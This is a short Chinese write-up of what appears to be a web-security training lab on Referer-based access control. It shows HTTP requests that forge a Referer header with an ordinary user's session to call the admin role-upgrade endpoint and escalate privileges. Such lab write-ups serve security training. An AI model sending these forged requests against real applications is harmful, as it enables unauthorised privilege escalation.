# 实验：基于 Referer 的访问控制

本实验基于 Referer 头控制对某些管理员功能的访问。你可以通过使用凭据 `administrator:admin` 登录来熟悉管理员面板。

为了解决本实验，请使用凭据 `wiener:peter` 登录，并利用有缺陷的访问控制将自己提升为管理员。

## 步骤

使用管理员凭据登录后访问管理功能，使用权限设置功能
1. 访问管理员页面
    ```http
    GET /admin HTTP/2
    Cookie: session=hfYMtHMAVie6TgijCprlfJIsVO0jvVuf
    ```
2. 使用权限设置功能
    ```http
    GET /admin-roles?username=carlos&action=upgrade HTTP/2
    Cookie: session=hfYMtHMAVie6TgijCprlfJIsVO0jvVuf
    Referer: https://0a0b003703be660380735d1200be0056.web-security-academy.net/admin
    ```

尝试移除会话 cookie 后访问权限设置功能
1. 管理员页面 401，失败
2. 权限设置端点 401，失败。此时包含引用头部

尝试获取普通用户凭证后再次访问权限设置功能
1. 管理员页面 401，失败
2. 权限设置端点 302，成功。此时包含引用头部
    - 移除引用头部后 401，失败

普通使用中，将请求发送到重复器手动测试。基于之前的请求，此时或许包含多步骤的正确引用头部，而未察觉应用程序可能使用了引用头部进行验证。
